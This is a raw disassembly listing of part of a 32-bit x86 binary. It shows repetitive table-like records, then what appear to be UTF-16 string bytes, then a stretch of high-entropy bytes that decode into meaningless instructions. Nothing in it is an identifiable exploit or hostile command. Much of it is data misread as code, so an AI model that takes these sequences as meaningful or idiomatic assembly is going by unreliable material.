  410f37:	or     DWORD PTR [eax],eax
  410f39:	add    ah,ah
  410f3b:	add    al,0x0
  410f3d:	add    BYTE PTR [eax],al
  410f3f:	add    BYTE PTR [eax],al
  410f41:	add    BYTE PTR [ebx+ebx*2+0x9150001],ch
  410f48:	add    BYTE PTR [eax],al
  410f4a:	in     al,0x4
  410f4c:	add    BYTE PTR [eax],al
  410f4e:	add    BYTE PTR [eax],al
  410f50:	add    BYTE PTR [eax],al
  410f52:	shl    DWORD PTR [ecx+eax*1+0x0],0xd
  410f57:	or     DWORD PTR [eax],eax
  410f59:	add    ah,ah
  410f5b:	add    al,0x0
  410f5d:	add    BYTE PTR [eax],al
  410f5f:	add    BYTE PTR [eax],al
  410f61:	add    dh,cl
  410f63:	ins    DWORD PTR es:[edi],dx
  410f64:	add    DWORD PTR [eax],eax
  410f66:	or     eax,0xe4000009
  410f6b:	add    al,0x0
  410f6d:	add    BYTE PTR [eax],al
  410f6f:	add    BYTE PTR [eax],al
  410f71:	add    bl,bl
  410f73:	jbe    0x410f76
  410f75:	add    ch,bh
  410f77:	or     BYTE PTR [eax],al
  410f79:	add    ah,ah
  410f7b:	add    al,0x0
  410f7d:	add    BYTE PTR [eax],al
  410f7f:	add    BYTE PTR [eax],al
  410f81:	add    al,bl
  410f83:	jg     0x410f86
  410f85:	add    BYTE PTR [ecx],dl
  410f87:	or     DWORD PTR [eax],eax
  410f89:	add    ah,ah
  410f8b:	add    al,0x0
  410f8d:	add    BYTE PTR [eax],al
  410f8f:	add    BYTE PTR [eax],al
  410f91:	add    cl,ch
  410f93:	mov    BYTE PTR [ecx],al
  410f95:	add    BYTE PTR ds:0xe4000009,cl
  410f9b:	add    al,0x0
  410f9d:	add    BYTE PTR [eax],al
  410f9f:	add    BYTE PTR [eax],al
  410fa1:	add    dh,dh
  410fa3:	xchg   ecx,eax
  410fa4:	add    DWORD PTR [eax],eax
  410fa6:	adc    eax,0xe4000009
  410fab:	add    al,0x0
  410fad:	add    BYTE PTR [eax],al
  410faf:	add    BYTE PTR [eax],al
  410fb1:	add    BYTE PTR [ebx],cl
  410fb3:	fwait
  410fb4:	add    DWORD PTR [eax],eax
  410fb6:	or     eax,0xe4000009
  410fbb:	add    al,0x0
  410fbd:	add    BYTE PTR [eax],al
  410fbf:	add    BYTE PTR [eax],al
  410fc1:	add    BYTE PTR [eax],bl
  410fc3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410fc4:	add    DWORD PTR [eax],eax
  410fc6:	adc    DWORD PTR [ecx],ecx
  410fc8:	add    BYTE PTR [eax],al
  410fca:	in     al,0x4
  410fcc:	add    BYTE PTR [eax],al
  410fce:	add    BYTE PTR [eax],al
  410fd0:	add    BYTE PTR [eax],al
  410fd2:	sub    DWORD PTR [ebp+0x9190001],ebp
  410fd8:	add    BYTE PTR [eax],al
  410fda:	in     al,0x4
  410fdc:	add    BYTE PTR [eax],al
  410fde:	add    BYTE PTR [eax],al
  410fe0:	add    BYTE PTR [eax],al
  410fe2:	inc    edx
  410fe3:	mov    dh,0x1
  410fe5:	add    BYTE PTR [ecx],bl
  410fe7:	or     DWORD PTR [eax],eax
  410fe9:	add    ah,ah
  410feb:	add    al,0x0
  410fed:	add    BYTE PTR [eax],al
  410fef:	add    BYTE PTR [eax],al
  410ff1:	add    BYTE PTR [ebx-0x41],bl
  410ff4:	add    DWORD PTR [eax],eax
  410ff6:	adc    eax,0xe4000009
  410ffb:	add    al,0x0
  410ffd:	add    BYTE PTR [eax],al
  410fff:	add    BYTE PTR [eax],al
  411001:	add    BYTE PTR [eax-0x38],dh
  411004:	add    DWORD PTR [eax],eax
  411006:	adc    DWORD PTR [ecx],ecx
  411008:	add    BYTE PTR [eax],al
  41100a:	in     al,0x4
  41100c:	add    BYTE PTR [eax],al
  41100e:	add    BYTE PTR [eax],al
  411010:	add    BYTE PTR [eax],al
  411012:	adc    ecx,0x90d0001
  411018:	add    BYTE PTR [eax],al
  41101a:	in     al,0x4
  41101c:	add    BYTE PTR [eax],al
  41101e:	add    BYTE PTR [eax],al
  411020:	add    BYTE PTR [eax],al
  411022:	mov    ds,edx
  411024:	add    DWORD PTR [eax],eax
  411026:	sbb    eax,0xe4000009
  41102b:	add    al,0x0
  41102d:	add    BYTE PTR [eax],al
  41102f:	add    BYTE PTR [eax],al
  411031:	add    BYTE PTR [ebx+0x110001e3],ch
  411037:	or     DWORD PTR [eax],eax
  411039:	add    ah,ah
  41103b:	add    al,0x0
  41103d:	add    BYTE PTR [eax],al
  41103f:	add    BYTE PTR [eax],al
  411041:	add    BYTE PTR [esp+ebp*8+0x9110001],bh
  411048:	add    BYTE PTR [eax],al
  41104a:	in     al,0x4
  41104c:	add    BYTE PTR [eax],al
  41104e:	add    BYTE PTR [eax],al
  411050:	add    BYTE PTR [eax],al
  411052:	int    0xf5
  411054:	add    DWORD PTR [eax],eax
  411056:	adc    eax,0xe4000009
  41105b:	add    al,0x0
  41105d:	add    BYTE PTR [eax],al
  41105f:	add    BYTE PTR [eax],al
  411061:	add    dl,ah
  411063:	inc    BYTE PTR [ecx]
  411065:	add    BYTE PTR [ecx],dl
  411067:	or     DWORD PTR [eax],eax
  411069:	add    ah,ah
  41106b:	add    al,0x0
  41106d:	add    BYTE PTR [eax],al
  41106f:	add    BYTE PTR [eax],al
  411071:	add    bl,dh
  411073:	pop    es
  411074:	add    al,BYTE PTR [eax]
  411076:	or     eax,0xe4000009
  41107b:	add    al,0x0
  41107d:	add    BYTE PTR [eax],al
  41107f:	add    BYTE PTR [eax],al
  411081:	add    BYTE PTR [eax],al
  411083:	adc    DWORD PTR [edx],eax
  411085:	add    BYTE PTR ds:0xe4000009,dl
  41108b:	add    al,0x0
  41108d:	add    BYTE PTR [eax],al
  41108f:	add    BYTE PTR [eax],al
  411091:	add    BYTE PTR ds:0xd00021a,dl
  411097:	or     DWORD PTR [eax],eax
  411099:	add    ah,ah
  41109b:	add    al,0x0
  41109d:	add    BYTE PTR [eax],al
  41109f:	add    BYTE PTR [eax],al
  4110a1:	add    BYTE PTR ds:0x56004100,cl
  4110a7:	add    BYTE PTR [esi+0x0],dl
  4110aa:	pop    edi
  4110ab:	add    BYTE PTR [ebp+0x0],cl
  4110ae:	inc    esi
  4110af:	add    BYTE PTR [edx+0x0],bl
  4110b2:	xor    DWORD PTR [eax],eax
  4110b4:	pop    edi
  4110b5:	add    BYTE PTR [edi+0x0],al
  4110b8:	pop    ecx
  4110b9:	add    BYTE PTR [edx+0x0],cl
  4110bc:	aaa    
  4110bd:	add    BYTE PTR [esi],cl
  4110bf:	add    BYTE PTR [ebp+0x0],dl
  4110c2:	xor    eax,DWORD PTR [eax]
  4110c4:	dec    ecx
  4110c5:	add    BYTE PTR [edi+0x0],bl
  4110c8:	cmp    BYTE PTR [eax],al
  4110ca:	push   ecx
  4110cb:	add    BYTE PTR [eax],dh
  4110cd:	add    BYTE PTR [ebx+0x0],cl
  4110d0:	dec    ebp
  4110d1:	add    BYTE PTR [edi],dh
  4110d3:	add    BYTE PTR [ecx],bh
  4110d5:	add    BYTE PTR [edi+0x0],bl
  4110d8:	push   ebx
  4110d9:	add    BYTE PTR [eax+0x0],dl
  4110dc:	or     BYTE PTR [eax],al
  4110de:	inc    ebp
  4110df:	add    BYTE PTR [eax],bh
  4110e1:	add    BYTE PTR [eax],bh
  4110e3:	add    BYTE PTR [edi+0x0],bl
  4110e6:	dec    ebx
  4110e7:	add    BYTE PTR [eax+0x0],cl
  4110ea:	push   eax
  4110eb:	add    BYTE PTR [ecx],bh
  4110ed:	add    BYTE PTR [ebx],cl
  4110ef:	add    BYTE PTR [edi+0x0],cl
  4110f2:	aaa    
  4110f3:	add    BYTE PTR [eax],dh
  4110f5:	add    BYTE PTR [edx],dh
  4110f7:	add    BYTE PTR [edi+0x0],bl
  4110fa:	cmp    DWORD PTR [eax],eax
  4110fc:	cmp    BYTE PTR [eax],al
  4110fe:	inc    edi
  4110ff:	add    BYTE PTR [edi+0x0],bl
  411102:	xor    BYTE PTR [eax],al
  411104:	dec    ebp
  411105:	add    BYTE PTR [eax+eax*1],cl
  411108:	inc    esi
  411109:	add    BYTE PTR [edx+0x0],bl
  41110c:	dec    esp
  41110d:	add    BYTE PTR [edi+0x0],bl
  411110:	add    BYTE PTR ss:[ebx],dh
  411113:	add    BYTE PTR [edi+0x0],cl
  411116:	push   esi
  411117:	add    BYTE PTR [eax+eax*1],dh
  41111a:	pop    edi
  41111b:	add    BYTE PTR [eax],bh
  41111d:	add    BYTE PTR [esi+0x0],cl
  411120:	or     BYTE PTR [eax],al
  411122:	dec    edi
  411123:	add    BYTE PTR [edx+0x0],dl
  411126:	push   esp
  411127:	add    BYTE PTR [edi+0x0],bl
  41112a:	push   ebp
  41112b:	add    BYTE PTR [edx],dh
  41112d:	add    BYTE PTR [ecx+0x0],bl
  411130:	xor    eax,DWORD PTR [eax]
  411132:	or     BYTE PTR [eax],al
  411134:	inc    edi
  411135:	add    BYTE PTR [ecx+0x0],cl
  411138:	push   edi
  411139:	add    BYTE PTR [edi+0x0],bl
  41113c:	xor    eax,0x44003100
  411141:	add    BYTE PTR [ecx],dh
  411143:	add    BYTE PTR [eax],cl
  411145:	add    BYTE PTR [ebp+0x0],al
  411148:	push   ebp
  411149:	add    BYTE PTR [edi],dh
  41114b:	add    BYTE PTR [eax],dh
  41114d:	add    BYTE PTR [edi+0x0],bl
  411150:	inc    esi
  411151:	add    BYTE PTR [eax+eax*1+0x35],al
  411155:	add    BYTE PTR [edx],cl
  411157:	add    BYTE PTR [ebp+0x0],cl
  41115a:	xor    al,0x0
  41115c:	push   esi
  41115d:	add    BYTE PTR [edi+0x0],bl
  411160:	dec    eax
  411161:	add    BYTE PTR [eax],dh
  411163:	add    BYTE PTR [eax+0x0],bl
  411166:	inc    esp
  411167:	add    BYTE PTR ds:0xb003000,dh
  41116d:	add    BYTE PTR [ecx+0x0],dl
  411170:	xor    al,0x0
  411172:	pop    edx
  411173:	add    BYTE PTR [edi+0x0],bl
  411176:	inc    edx
  411177:	add    BYTE PTR [eax+eax*1+0x42],al
  41117b:	add    BYTE PTR [ebx+0x0],dl
  41117e:	pop    edi
  41117f:	add    BYTE PTR [eax],dh
  411181:	add    BYTE PTR [ebp+0x0],dl
  411184:	or     al,0x0
  411186:	push   edx
  411187:	add    BYTE PTR [edi+0x0],al
  41118a:	push   esp
  41118b:	add    BYTE PTR [eax],bh
  41118d:	add    BYTE PTR [esi],dh
  41118f:	add    BYTE PTR [edi+0x0],bl
  411192:	dec    eax
  411193:	add    BYTE PTR [ebp+0x0],al
  411196:	push   esp
  411197:	add    BYTE PTR [edx+0x0],cl
  41119a:	push   edi
  41119b:	add    BYTE PTR [ecx+0x0],dl
  41119e:	or     DWORD PTR [eax],eax
  4111a0:	pop    edx
  4111a1:	add    BYTE PTR [edx+0x0],dl
  4111a4:	dec    edx
  4111a5:	add    BYTE PTR [edi+0x0],bl
  4111a8:	xor    BYTE PTR [eax],al
  4111aa:	aaa    
  4111ab:	add    BYTE PTR [esi+0x0],dl
  4111ae:	inc    edx
  4111af:	add    BYTE PTR [eax],dh
  4111b1:	add    BYTE PTR [esi],cl
  4111b3:	add    BYTE PTR [eax+0x0],cl
  4111b6:	cmp    DWORD PTR [eax],eax
  4111b8:	dec    ebx
  4111b9:	add    BYTE PTR [edi+0x0],bl
  4111bc:	xor    al,0x0
  4111be:	inc    ecx
  4111bf:	add    BYTE PTR [ecx],bh
  4111c1:	add    BYTE PTR [esi+0x0],dl
  4111c4:	cmp    DWORD PTR [eax],eax
  4111c6:	pop    edi
  4111c7:	add    BYTE PTR [eax+0x0],cl
  4111ca:	dec    ecx
  4111cb:	add    BYTE PTR [eax+eax*1+0x58],al
  4111cf:	add    BYTE PTR [eax],cl
  4111d1:	add    BYTE PTR [eax+0x0],dl
  4111d4:	dec    esi
  4111d5:	add    BYTE PTR [eax+0x0],cl
  4111d8:	pop    edi
  4111d9:	add    BYTE PTR [eax],dh
  4111db:	add    BYTE PTR [ecx+0x0],dl
  4111de:	xor    DWORD PTR [eax],eax
  4111e0:	dec    ebp
  4111e1:	add    BYTE PTR [ebx],cl
  4111e3:	add    BYTE PTR [edi+0x0],cl
  4111e6:	dec    esp
  4111e7:	add    BYTE PTR [ecx+0x0],bl
  4111ea:	pop    edi
  4111eb:	add    BYTE PTR [eax+0x0],bl
  4111ee:	dec    esp
  4111ef:	add    BYTE PTR [edi+0x0],cl
  4111f2:	push   eax
  4111f3:	add    BYTE PTR [edi+0x0],bl
  4111f6:	xor    eax,DWORD PTR [eax]
  4111f8:	inc    edi
  4111f9:	add    BYTE PTR ds:0x51004f00,cl
  4111ff:	add    BYTE PTR [edx+0x0],cl
  411202:	pop    edi
  411203:	add    BYTE PTR [edx],dh
  411205:	add    BYTE PTR ds:0x59003600,dh
  41120b:	add    BYTE PTR [edi+0x0],bl
  41120e:	cmp    DWORD PTR [eax],eax
  411210:	cmp    DWORD PTR [eax],eax
  411212:	push   edx
  411213:	add    BYTE PTR [ebx],dh
  411215:	add    BYTE PTR [ecx],cl
  411217:	add    BYTE PTR [ebx+0x0],cl
  41121a:	push   ecx
  41121b:	add    BYTE PTR [ebp+0x0],dl
  41121e:	pop    edi
  41121f:	add    BYTE PTR [esi+0x0],dl
  411222:	xor    eax,0x32004400
  411227:	add    BYTE PTR [eax],dh
  411229:	add    BYTE PTR [edx],cl
  41122b:	add    BYTE PTR [eax+0x0],dl
  41122e:	push   eax
  41122f:	add    BYTE PTR [esi],dh
  411231:	add    BYTE PTR [edi+0x0],bl
  411234:	dec    eax
  411235:	add    BYTE PTR [ebp+0x0],cl
  411238:	xor    DWORD PTR [eax],eax
  41123a:	xor    al,BYTE PTR [eax]
  41123c:	pop    edi
  41123d:	add    BYTE PTR [eax+eax*1+0xa],dl
  411241:	add    BYTE PTR [ebp+0x0],al
  411244:	pop    eax
  411245:	add    BYTE PTR [eax+eax*1],dh
  411248:	aaa    
  411249:	add    BYTE PTR [esi],dh
  41124b:	add    BYTE PTR [esi],dh
  41124d:	add    BYTE PTR ds:0x48005f00,dh
  411253:	add    BYTE PTR [edx],dh
  411255:	add    BYTE PTR [ebx],cl
  411257:	add    BYTE PTR [ebx+0x0],dl
  41125a:	inc    edi
  41125b:	add    BYTE PTR [eax],bh
  41125d:	add    BYTE PTR [edi+0x0],bl
  411260:	inc    edi
  411261:	add    BYTE PTR [edx+0x0],cl
  411264:	pop    ecx
  411265:	add    BYTE PTR [esi],dh
  411267:	add    BYTE PTR [edi+0x0],bl
  41126a:	cmp    DWORD PTR [eax],eax
  41126c:	cmp    DWORD PTR [eax],eax
  41126e:	push   cs
  41126f:	add    BYTE PTR [ebp+0x0],dl
  411272:	xor    DWORD PTR [eax],eax
  411274:	add    BYTE PTR ss:[edi+0x0],bl
  411278:	pop    ecx
  411279:	add    BYTE PTR [edx+0x0],bl
  41127c:	push   ebx
  41127d:	add    BYTE PTR [eax],dh
  41127f:	add    BYTE PTR [eax],bh
  411281:	add    BYTE PTR [edi+0x0],bl
  411284:	push   ecx
  411285:	add    BYTE PTR [ebx+0x0],al
  411288:	push   edi
  411289:	add    BYTE PTR [edx],dh
  41128b:	add    BYTE PTR [ebx],cl
  41128d:	add    BYTE PTR [eax+eax*1+0x4e],dl
  411291:	add    BYTE PTR [edx],dh
  411293:	add    BYTE PTR [edi+0x0],bl
  411296:	push   eax
  411297:	add    BYTE PTR [edx+0x0],al
  41129a:	inc    edx
  41129b:	add    BYTE PTR [ecx+0x0],bl
  41129e:	pop    edi
  41129f:	add    BYTE PTR [ebp+0x0],cl
  4112a2:	push   esp
  4112a3:	add    BYTE PTR [eax+eax*1],cl
  4112a6:	pop    edx
  4112a7:	add    BYTE PTR [eax+0x0],cl
  4112aa:	add    BYTE PTR ss:[edi+0x0],bl
  4112ae:	xor    al,BYTE PTR [eax]
  4112b0:	inc    edx
  4112b1:	add    BYTE PTR [ebx+0x0],al
  4112b4:	pop    edi
  4112b5:	add    BYTE PTR [ebp+0x0],dl
  4112b8:	pop    ecx
  4112b9:	add    BYTE PTR [edi],dh
  4112bb:	add    BYTE PTR [edi+0x0],cl
  4112be:	push   cs
  4112bf:	add    BYTE PTR [ebp+0x0],dl
  4112c2:	xor    BYTE PTR [eax],al
  4112c4:	inc    ebx
  4112c5:	add    BYTE PTR [edi+0x0],bl
  4112c8:	inc    edi
  4112c9:	add    BYTE PTR ds:0x38004100,dh
  4112cf:	add    BYTE PTR [edi+0x0],bl
  4112d2:	push   edx
  4112d3:	add    BYTE PTR [eax+eax*1],dh
  4112d6:	xor    BYTE PTR [eax],al
  4112d8:	pop    edi
  4112d9:	add    BYTE PTR [ecx+0x0],al
  4112dc:	or     al,0x0
  4112de:	push   esi
  4112df:	add    BYTE PTR [eax],dh
  4112e1:	add    BYTE PTR [edi+0x0],cl
  4112e4:	xor    al,BYTE PTR [eax]
  4112e6:	pop    edi
  4112e7:	add    BYTE PTR [esi+0x0],cl
  4112ea:	push   ebp
  4112eb:	add    BYTE PTR [esi+0x0],dl
  4112ee:	inc    ecx
  4112ef:	add    BYTE PTR [eax+0x0],dl
  4112f2:	pop    edi
  4112f3:	add    BYTE PTR [eax],bh
  4112f5:	add    BYTE PTR [eax],cl
  4112f7:	add    BYTE PTR [edi+0x0],dl
  4112fa:	dec    eax
  4112fb:	add    BYTE PTR [eax+0x0],bl
  4112fe:	pop    edi
  4112ff:	add    BYTE PTR [ebp+0x0],cl
  411302:	push   esi
  411303:	add    BYTE PTR [edi+0x0],cl
  411306:	push   edx
  411307:	add    BYTE PTR ds:0x47004e00,cl
  41130d:	add    BYTE PTR [eax+eax*1],dh
  411310:	xor    DWORD PTR [eax],eax
  411312:	pop    edi
  411313:	add    BYTE PTR [esi+0x0],al
  411316:	push   esp
  411317:	add    BYTE PTR [edx+0x0],bl
  41131a:	dec    ecx
  41131b:	add    BYTE PTR [edi+0x0],bl
  41131e:	inc    edi
  41131f:	add    BYTE PTR [ecx+0x0],cl
  411322:	dec    eax
	...
  41132f:	add    BYTE PTR [eax],al
  411331:	add    BYTE PTR [ecx+0x6a],ah
  411334:	jmp    0xffd8fe50
  411339:	jle    0x411341
  41133b:	js     0x4112ea
  41133d:	aam    0xda
  41133f:	(bad)  
  411340:	push   edi
  411341:	iret   
  411342:	call   0x254114c5
  411347:	pop    es
  411348:	add    BYTE PTR [eax],al
  41134a:	xor    bl,ch
  41134c:	inc    edx
  41134d:	mov    ebp,0x9332687
  411352:	enter  0x7bfd,0xa5
  411356:	nop
  411357:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411358:	enter  0xfb02,0x6
  41135c:	jb     0x4112e7
  41135e:	cmp    bl,al
  411360:	mov    dh,0x63
  411362:	shr    BYTE PTR [eax+0x50],0xb8
  411366:	mov    ebx,0x3e5a58ed
  41136b:	clc    
  41136c:	push   esi
  41136d:	inc    eax
  41136e:	dec    edx
  41136f:	cmc    
  411370:	lea    ebx,[edx-0x34]
  411373:	dec    esi
  411374:	dec    ebx
  411375:	mov    bh,0x10
  411377:	push   esi
  411378:	or     ah,dl
  41137a:	in     eax,0x3e
  41137c:	dec    esi
  41137d:	push   ss
  41137e:	test   BYTE PTR ds:0x7b72bf89,dl
  411384:	dec    edx
  411385:	jmp    0x41136b
  411387:	or     BYTE PTR [edi+0x43],bl
  41138a:	xchg   edi,eax
  41138b:	call   0x36ff:0x3c55c1be
  411392:	imul   esp,DWORD PTR ds:0x118843c1,0x23
  411399:	pop    es
  41139a:	inc    ebx
  41139b:	or     dl,BYTE PTR [ebp-0x50d87fa8]
  4113a1:	and    eax,0xca16342b
  4113a6:	fucomi st,st(3)
  4113a8:	mov    bl,0xf3
  4113aa:	pop    ecx
  4113ab:	aam    0x4a
  4113ad:	push   eax
  4113ae:	pop    ds
  4113af:	mov    ecx,0x8ac1c3b0
  4113b4:	jnp    0x4113f4
  4113b6:	into   
  4113b7:	jecxz  0x41141e
  4113b9:	pop    esp
  4113ba:	scas   al,BYTE PTR es:[edi]
  4113bb:	mov    ds:0xf396ba96,eax
  4113c0:	outs   dx,DWORD PTR ds:[esi]
  4113c1:	repnz in eax,0xe7
  4113c4:	mov    eax,cs:0x5b3befa3
  4113ca:	add    BYTE PTR [ecx],bl
  4113cc:	inc    esp
  4113cd:	pop    esp
  4113ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4113cf:	cs leave 
  4113d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4113d2:	je     0x41143e
  4113d4:	ja     0x41140c
  4113d6:	leave  
  4113d7:	cli    
  4113d8:	mov    al,0xe3
  4113da:	push   ebx
  4113db:	cld    
  4113dc:	adc    al,0x2b
  4113de:	push   0xffffffc3
  4113e0:	aam    0x9c
  4113e2:	js     0x4113b8
  4113e4:	cmp    edx,esp
  4113e6:	xor    eax,DWORD PTR [ecx+esi*4+0x69b0db83]
  4113ed:	xor    bh,BYTE PTR [edi-0x29ec22b1]
  4113f3:	sti    
  4113f4:	sbb    cl,BYTE PTR [esi]
  4113f6:	lea    ebx,[ebx-0x11]
  4113f9:	fs fwait
  4113fb:	test   eax,0x25b85812
  411400:	push   es
  411401:	test   dh,dl
  411403:	call   0xae8e:0xb2d760fb
  41140a:	push   es
  41140b:	retf   
  41140c:	jae    0x411441
  41140e:	lods   al,BYTE PTR ds:[esi]
  41140f:	es sar ecx,0x2e
  411413:	iret   
  411414:	add    ecx,DWORD PTR [eax+eax*4]
  411417:	xchg   ebx,eax
  411418:	push   esi
  411419:	and    DWORD PTR [ecx+0x46],edi
  41141c:	imul   eax,edx,0x78
  41141f:	in     al,0xb
  411421:	mov    ds:0x233adcd5,eax
  411426:	add    esp,DWORD PTR [esi]
  411428:	lds    edx,FWORD PTR [ebp+0x23]
  41142b:	mov    ebp,0xbb59c1b
  411430:	push   esp
  411431:	int    0x6f
  411433:	imul   edx,DWORD PTR [edx],0xffffff90
  411436:	mov    cl,0x74
  411438:	push   ss
  411439:	leave  
  41143a:	sbb    eax,0xdd0a5212
  41143f:	adc    al,0x9
  411441:	dec    esp
  411442:	cli    
  411443:	inc    esi
  411444:	leave  
  411445:	loope  0x41144b
  411447:	retf   0x42b4
  41144a:	pusha  
  41144b:	mov    al,0x2d
  41144d:	fwait
  41144e:	sub    eax,0xd69cade8
  411453:	fcomp  QWORD PTR [ecx+0x50]
  411456:	xchg   esp,eax
  411457:	popf   
  411458:	sbb    DWORD PTR [edx-0x2220009f],0xffffff9a
  41145f:	bound  eax,QWORD PTR [edi]
  411461:	in     al,0x3d
  411463:	std    
  411464:	inc    edi
  411465:	in     al,0x8f
  411467:	jnp    0x4113f2
  411469:	lahf   
  41146a:	jl     0x41146d
  41146c:	fs int3 
  41146e:	jmp    0x411484
  411470:	call   0x831c:0xe51bffd
  411477:	push   es
  411478:	xchg   ecx,eax
  411479:	add    BYTE PTR [esi],bh
  41147b:	jmp    0x4114f5
  41147d:	adc    eax,0x7d3b49f0
  411482:	mov    bl,0xf1
  411484:	add    al,0x1f
  411486:	mov    ah,0xae
  411488:	mov    dh,0xf7
  41148a:	ror    ah,0xed
  41148d:	bound  eax,QWORD PTR [ecx+0x1d05eff0]
  411493:	inc    DWORD PTR [edx]
  411495:	jl     0x4114ab
  411497:	xor    DWORD PTR [edx-0x72],esp
  41149a:	xchg   ebx,eax
  41149b:	cmp    eax,0x1152135d
  4114a0:	push   esp
  4114a1:	push   DWORD PTR [ebx]
  4114a3:	and    al,0x5c
  4114a5:	test   bl,dl
  4114a7:	nop
  4114a8:	ins    BYTE PTR es:[edi],dx
  4114a9:	lahf   
  4114aa:	mov    ebx,0x2d9f7c7d
  4114af:	lock adc al,ch
  4114b2:	mov    ds:0xe0c22e1a,al
  4114b7:	xor    DWORD PTR [ecx+0x53],edi
  4114ba:	stos   BYTE PTR es:[edi],al
  4114bb:	lahf   
  4114bc:	out    dx,al
  4114bd:	dec    ebx
  4114be:	ja     0x41145c
  4114c0:	loopne 0x411520
  4114c2:	adc    BYTE PTR [edi],dh
  4114c4:	dec    edi
  4114c5:	(bad)  
  4114c6:	jmp    0x4114c5
  4114c8:	xchg   esi,eax
  4114c9:	test   BYTE PTR [ecx-0x4e14c157],bh
  4114cf:	push   0xe9ee4c10
  4114d4:	mov    ecx,0xfa497eb6
  4114d9:	cmp    ah,bl
  4114db:	xor    DWORD PTR [eiz*1-0x35a49134],ebp
  4114e2:	lods   al,BYTE PTR ds:[esi]
  4114e3:	push   ss
  4114e4:	aad    0x61
  4114e6:	clc    
  4114e7:	aas    
  4114e8:	add    eax,0x74524595
  4114ed:	ds add eax,0x77cbfdd2
  4114f3:	pop    ebp
  4114f4:	sub    BYTE PTR [eiz*4+0x42c756df],al
  4114fb:	adc    eax,0x4fd9d497
  411500:	les    eax,FWORD PTR [ebx+0x7c991964]
  411506:	rcl    bh,cl
  411508:	cmp    ah,dh
  41150a:	sbb    dl,BYTE PTR [esp+eax*8]
  41150d:	fcmovnb st,st(3)
  41150f:	lea    ebp,[esi+0x2]
  411512:	or     eax,DWORD PTR [esi-0x492901b4]
  411518:	out    dx,al
  411519:	popa   
  41151a:	dec    ebx
  41151b:	psrlq  mm7,QWORD PTR [ecx]
  41151e:	xchg   ecx,eax
  41151f:	xor    DWORD PTR [ebp-0x28],esi
  411522:	test   DWORD PTR ss:[ecx],edx
  411525:	ja     0x411586
  411527:	add    al,BYTE PTR [edx+0x4b]
  41152a:	add    ah,BYTE PTR [esi]
  41152c:	rcl    DWORD PTR [edi+0x50],1
  41152f:	dec    edx
  411530:	sbb    ebx,eax
  411532:	test   cl,dl
  411534:	push   edx
  411535:	rcr    BYTE PTR [ecx+esi*2+0x12629a71],0x41
  41153d:	push   ds
  41153e:	outs   dx,BYTE PTR ds:[esi]
  41153f:	pop    es
  411540:	push   ecx
  411541:	cmp    al,0x92
  411543:	into   
  411544:	adc    al,0xbe
  411546:	dec    ecx
  411547:	push   eax
  411548:	ins    DWORD PTR es:[edi],dx
  411549:	cmp    BYTE PTR [ebp-0x42],ch
  41154c:	mov    edx,0x1888e054
  411551:	das    
  411552:	jnp    0x41157f
  411554:	inc    edi
  411555:	add    BYTE PTR [ebx-0x41],dl
  411558:	pop    esp
  411559:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41155a:	sub    eax,DWORD PTR [edx+0x641c5714]
  411560:	stos   DWORD PTR es:[edi],eax
  411561:	push   es
  411562:	or     al,0x54
  411564:	dec    ecx
  411565:	retf   0xaa8f
  411568:	stos   BYTE PTR es:[edi],al
  411569:	ins    BYTE PTR es:[edi],dx
  41156a:	popf   
  41156b:	jno    0x411553
  41156d:	sub    DWORD PTR [edi+0x6a],edx
  411570:	or     ebx,DWORD PTR [ecx]
  411572:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411573:	int3   
  411574:	sti    
  411575:	pop    edx
  411576:	pop    esi
  411577:	mov    edx,eax
  411579:	mov    cl,0xf1
  41157b:	and    eax,0x4425e268
  411580:	and    BYTE PTR [ebp+edi*2-0x68],al
  411584:	mov    edx,0x4deadf1b
  411589:	aad    0xe8
  41158b:	sub    DWORD PTR [ecx-0x5b09f7eb],0x50
  411592:	(bad)  
  411593:	aas    
  411594:	dec    esi
  411595:	xchg   ebx,eax
  411596:	mov    edi,0x544bfa35
  41159b:	mov    edi,DWORD PTR [ecx+edx*1+0x7db47b1a]
  4115a2:	inc    ebp
  4115a3:	out    0x1a,eax
  4115a5:	scas   al,BYTE PTR es:[edi]
  4115a6:	cmp    BYTE PTR [eax+0x47b88d59],0x19
  4115ad:	in     al,0x78
  4115af:	aam    0xf2
  4115b1:	adc    BYTE PTR [ebx+edi*1-0x73],al
  4115b5:	jno    0x4115c6
  4115b7:	dec    esp
  4115b8:	inc    ebx
  4115b9:	and    al,0x4f
  4115bb:	pop    ecx
  4115bc:	in     eax,dx
  4115bd:	jp     0x4115ce
  4115bf:	mov    eax,ds:0x83b25a10
  4115c4:	je     0x4115e4
  4115c6:	push   es
  4115c7:	jo     0x411629
  4115c9:	(bad)  
  4115cb:	sti    
  4115cc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4115cd:	loopne 0x411641
  4115cf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4115d0:	cmp    eax,0x14615eac
  4115d5:	inc    edx
  4115d6:	jmp    0x833f:0x909a8601
  4115dd:	outs   dx,BYTE PTR ds:[esi]
  4115de:	or     eax,0xc0b26e91
  4115e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4115e4:	cdq    
  4115e5:	xchg   esi,eax
  4115e6:	jmp    FWORD PTR [edx+0x6e]
  4115e9:	xor    BYTE PTR ds:0x6836dfba,al
  4115ef:	mov    al,ds:0x99085c7c
  4115f4:	in     eax,dx
  4115f5:	cmp    ah,dh
  4115f7:	and    al,0x9e
  4115f9:	pusha  
  4115fa:	mov    al,0x1d
  4115fc:	cld    
  4115fd:	int    0x83
  4115ff:	mov    ecx,0x30e5a3c3
  411604:	pop    edi
  411605:	mov    ebp,0xcbfeee46
  41160a:	out    0xac,eax
  41160c:	mov    edx,DWORD PTR [eax]
  41160e:	pop    eax
  41160f:	aad    0x6
  411611:	adc    edx,DWORD PTR [ebx+ecx*1+0x4b8cfc38]
  411618:	out    dx,eax
  411619:	fnstsw WORD PTR [edx]
  41161b:	ss ja  0x4115c6
  41161e:	bound  edx,QWORD PTR [ebx+eiz*4]
  411621:	in     al,0xc0
  411623:	stos   BYTE PTR es:[edi],al
  411624:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411625:	dec    esp
  411626:	sub    al,0xd0
  411628:	and    DWORD PTR [ebx],ebp
